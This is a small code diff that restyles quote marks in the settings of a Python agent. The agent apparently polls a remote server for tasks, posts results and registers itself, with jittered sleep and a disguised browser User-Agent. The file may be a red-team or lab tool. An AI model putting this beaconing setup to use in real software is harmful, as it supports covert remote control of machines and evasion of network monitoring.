@@ -14,14 +14,14 @@ import urllib.request
 import uuid
 import zlib
 
-REMOTE_HOST = "127.0.0.1"
+REMOTE_HOST = '127.0.0.1'
 REMOTE_PORT = 1337
 SLEEP_TIME = 1.0
 SLEEP_TIME_JITTER = 0.5
-TASKS_URL_PATHS = ["/tasks"]
-RESULTS_URL_PATHS = ["/results"]
-REGISTRATION_URL_PATHS = ["/register"]
-EXTRA_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0)"}
+TASKS_URL_PATHS = ['/tasks']
+RESULTS_URL_PATHS = ['/results']
+REGISTRATION_URL_PATHS = ['/register']
+EXTRA_HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0)'}
 AGENT_TYPE = "eula_multi"
 
 
